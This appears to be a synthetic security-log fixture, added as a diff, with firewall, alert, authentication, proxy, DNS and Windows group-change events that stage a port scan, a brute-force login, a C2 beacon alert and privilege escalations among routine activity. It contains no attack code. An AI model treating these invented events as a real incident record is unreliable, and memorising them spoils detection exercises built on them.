+event=firewall timestamp="2026-09-01 03:00:20" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=21 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:20" alert_id=A020 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:21" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=22 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:21" alert_id=A021 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:22" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=23 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:22" alert_id=A022 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:23" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=24 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:23" alert_id=A023 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:24" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=25 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:24" alert_id=A024 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:25" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=26 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:25" alert_id=A025 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:26" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=27 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:26" alert_id=A026 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:27" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=28 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:27" alert_id=A027 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:28" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=29 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:28" alert_id=A028 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=firewall timestamp="2026-09-01 03:00:29" src_ip=203.0.113.80 dst_ip=10.0.0.50 dst_port=30 action=BLOCK
+event=alerts timestamp="2026-09-01 03:00:29" alert_id=A029 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=alerts timestamp="2026-09-01 03:00:30" alert_id=A030 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=alerts timestamp="2026-09-01 03:00:31" alert_id=A031 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=alerts timestamp="2026-09-01 03:00:32" alert_id=A032 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=alerts timestamp="2026-09-01 03:00:33" alert_id=A033 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=alerts timestamp="2026-09-01 03:00:34" alert_id=A034 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=alerts timestamp="2026-09-01 03:00:35" alert_id=A035 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=alerts timestamp="2026-09-01 03:00:36" alert_id=A036 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=alerts timestamp="2026-09-01 03:00:37" alert_id=A037 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=alerts timestamp="2026-09-01 03:00:38" alert_id=A038 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=alerts timestamp="2026-09-01 03:00:39" alert_id=A039 rule="ET SCAN Suspicious inbound" src_ip=203.0.113.80 dst_ip=10.0.0.50 signature=SCAN-001 severity=medium
+event=auth timestamp="2026-09-01 03:00:40" src_ip=203.0.113.80 user=admin status=failure
+event=auth_events timestamp="2026-09-01 03:01:00" user=meera src_ip=198.51.100.91 country=US logon_type=interactive status=failure
+event=auth timestamp="2026-09-01 03:01:00" src_ip=203.0.113.80 user=admin status=failure
+event=auth_events timestamp="2026-09-01 03:01:20" user=meera src_ip=198.51.100.91 country=US logon_type=interactive status=failure
+event=auth timestamp="2026-09-01 03:01:20" src_ip=203.0.113.80 user=admin status=failure
+event=auth timestamp="2026-09-01 03:01:40" src_ip=203.0.113.80 user=admin status=failure
+event=auth timestamp="2026-09-01 03:02:00" src_ip=203.0.113.80 user=admin status=failure
+event=auth timestamp="2026-09-01 03:02:20" src_ip=203.0.113.80 user=admin status=failure
+event=auth timestamp="2026-09-01 03:02:40" src_ip=203.0.113.80 user=admin status=failure
+event=auth timestamp="2026-09-01 03:03:00" src_ip=203.0.113.80 user=admin status=failure
+event=auth timestamp="2026-09-01 03:04:00" src_ip=203.0.113.80 user=admin status=success
+event=firewall timestamp="2026-09-01 03:10:00" src_ip=203.0.113.81 dst_ip=10.0.0.10 dst_port=22 action=BLOCK
+event=alerts timestamp="2026-09-01 03:10:00" alert_id=A100 rule="Possible C2 beacon" src_ip=10.0.3.77 dst_ip=198.51.100.201 signature=C2-01 severity=high
+event=firewall timestamp="2026-09-01 03:10:01" src_ip=203.0.113.81 dst_ip=10.0.0.11 dst_port=22 action=BLOCK
+event=firewall timestamp="2026-09-01 03:10:02" src_ip=203.0.113.81 dst_ip=10.0.0.12 dst_port=22 action=BLOCK
+event=firewall timestamp="2026-09-01 03:10:03" src_ip=203.0.113.81 dst_ip=10.0.0.13 dst_port=22 action=BLOCK
+event=firewall timestamp="2026-09-01 03:10:04" src_ip=203.0.113.81 dst_ip=10.0.0.14 dst_port=22 action=BLOCK
+event=firewall timestamp="2026-09-01 03:10:05" src_ip=203.0.113.81 dst_ip=10.0.0.15 dst_port=22 action=BLOCK
+event=firewall timestamp="2026-09-01 03:10:06" src_ip=203.0.113.81 dst_ip=10.0.0.16 dst_port=22 action=BLOCK
+event=firewall timestamp="2026-09-01 03:10:07" src_ip=203.0.113.81 dst_ip=10.0.0.17 dst_port=22 action=BLOCK
+event=firewall timestamp="2026-09-01 03:10:08" src_ip=203.0.113.81 dst_ip=10.0.0.18 dst_port=22 action=BLOCK
+event=firewall timestamp="2026-09-01 03:10:09" src_ip=203.0.113.81 dst_ip=10.0.0.19 dst_port=22 action=BLOCK
+event=firewall timestamp="2026-09-01 03:10:10" src_ip=203.0.113.81 dst_ip=10.0.0.20 dst_port=22 action=BLOCK
+event=firewall timestamp="2026-09-01 03:10:11" src_ip=203.0.113.81 dst_ip=10.0.0.21 dst_port=22 action=BLOCK
+event=alerts timestamp="2026-09-01 03:12:00" alert_id=A101 rule="Malware download" src_ip=10.0.1.24 dst_ip=198.51.100.210 signature=DL-02 severity=high
+event=firewall timestamp="2026-09-01 04:00:00" src_ip=198.51.100.200 dst_ip=10.0.2.152 dst_port=22 action=BLOCK
+event=firewall timestamp="2026-09-01 04:05:00" src_ip=198.51.100.200 dst_ip=10.0.2.152 dst_port=22 action=BLOCK
+event=logins timestamp="2026-09-01 08:00:00" user=ananya src_ip=198.51.100.10 country_code=IN
+event=logins timestamp="2026-09-01 08:20:00" user=ananya src_ip=203.0.113.22 country_code=US
+event=proxy_downloads timestamp="2026-09-01 09:00:00" user=mira src_ip=10.0.2.5 domain=docs.example url=/guide.pdf file_type=pdf bytes=45000 category=business
+event=access timestamp="2026-09-01 09:00:00" src_ip=10.0.0.4 method=GET path=/ status=200 user_agent=Mozilla/5.0
+event=auth timestamp="2026-09-01 09:00:00" src_ip=10.0.0.8 user=mira status=failure
+event=auth timestamp="2026-09-01 09:00:00" src_ip=10.0.0.5 user=mira status=failure
+event=firewall timestamp="2026-09-01 09:00:00" src_ip=10.0.0.4 dst_ip=10.0.0.50 dst_port=443 action=ALLOW
+event=dns_logs timestamp="2026-09-01 09:00:00" src_host=10.0.0.8 query=www.corp.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 09:00:00" src_host=10.0.0.8 query=www.corp.example response=NOERROR
+event=access timestamp="2026-09-01 09:00:00" src_ip=10.0.0.5 method=GET path=/products status=200 user_agent=Mozilla/5.0
+event=access timestamp="2026-09-01 09:00:00" src_ip=10.0.0.5 method=GET path=/ status=200
+event=emails timestamp="2026-09-01 09:00:00" from_address=hr@corp.example return_path=hr@corp.example spf=pass dkim=pass subject="Policy update"
+event=endpoint timestamp="2026-09-01 09:00:00" host=WS-02 user=mira parent_process=explorer.exe child_process=notepad.exe command_line=notepad.exe
+event=alerts timestamp="2026-09-01 09:00:00" indicator_type=ip indicator=10.0.0.8 alert_name="Normal login" severity=low
+event=auth_remote timestamp="2026-09-01 09:00:00" user=mira src_host=WS-02 dst_host=SRV-01 status=success
+event=file_activity timestamp="2026-09-01 09:00:00" host=WS-02 user=mira file_path=C:\Docs\report.docx operation=write extension=.docx
+event=logins timestamp="2026-09-01 09:00:00" user=mira src_ip=198.51.100.11 country_code=IN
+event=alerts timestamp="2026-09-01 09:00:00" alert_id=A003 severity=low asset=WS-02 asset_criticality=2 ti_match=no confidence=45
+event=dns_logs timestamp="2026-09-01 09:01:00" src_host=10.0.0.8 query=mail.corp.example response=NOERROR
+event=dns_logs timestamp="2026-09-01 09:01:00" src_host=10.0.0.8 query=mail.corp.example response=NOERROR
+event=process_logs timestamp="2026-09-01 09:10:00" host=WS-02 user=karthik process=powershell.exe command_line="powershell.exe Get-Process"
+event=process_logs timestamp="2026-09-01 09:12:00" host=WS-03 user=mira process=cmd.exe command_line="cmd.exe /c dir"
+event=auth_events timestamp="2026-09-01 09:12:10" user=karthik src_ip=10.0.1.24 country=IN logon_type=interactive status=failure
+event=auth_events timestamp="2026-09-01 09:12:42" user=karthik src_ip=10.0.1.24 country=IN logon_type=interactive status=success
+event=user_activity timestamp="2026-09-01 09:50:00" user=mira src_ip=10.0.0.8 activity=login
+event=proxy timestamp="2026-09-01 10:00:00" user=mira src_ip=10.0.0.8 destination=drive.example bytes_out=2000000 category=cloud-storage
+event=user_activity timestamp="2026-09-01 10:00:00" user=ananya src_ip=10.0.1.24 activity=login
+event=logons timestamp="2026-09-01 10:05:00" user=mira src_ip=10.0.1.8 dst_host=WS-02 logon_type=10 status=success
+event=win_events timestamp="2026-09-01 10:30:00" event_id=4732 actor=admin target_user=helpdesk2 group=Administrators actor_is_admin=yes host=SRV-02
+event=proxy_downloads timestamp="2026-09-01 11:00:00" user=arun src_ip=10.0.0.9 domain=software.example url=/app.exe file_type=exe bytes=1500000 category=software
+event=logins timestamp="2026-09-01 11:00:00" user=mira src_ip=10.0.0.11 country_code=IN
+event=logons timestamp="2026-09-01 12:00:00" user=arun src_ip=10.0.0.9 dst_host=WS-03 logon_type=2 status=success
+event=logons timestamp="2026-09-01 22:30:00" user=admin src_ip=203.0.113.80 dst_host=SRV-DC1 logon_type=10 status=failure
+event=win_events timestamp="2026-09-01 23:50:00" event_id=4728 actor=svc_app target_user=backupadmin group="Domain Admins" actor_is_admin=no host=DC-01
+event=user_activity timestamp="2026-09-02 09:00:00" user=mira src_ip=10.0.0.8 activity=login
+event=user_activity timestamp="2026-09-02 10:15:00" user=ananya src_ip=10.0.1.24 activity=login
+event=user_activity timestamp="2026-09-03 02:00:00" user=ananya src_ip=198.51.100.77 activity=login
+event=user_activity timestamp="2026-09-03 09:00:00" user=mira src_ip=10.0.0.8 activity=login
+event=user_activity timestamp="2026-09-04 09:50:00" user=mira src_ip=10.0.0.8 activity=login
+event=user_activity timestamp="2026-09-05 09:20:00" user=mira src_ip=10.0.0.8 activity=login
+event=user_activity timestamp="2026-09-06 03:12:00" user=mira src_ip=198.51.100.77 activity=login
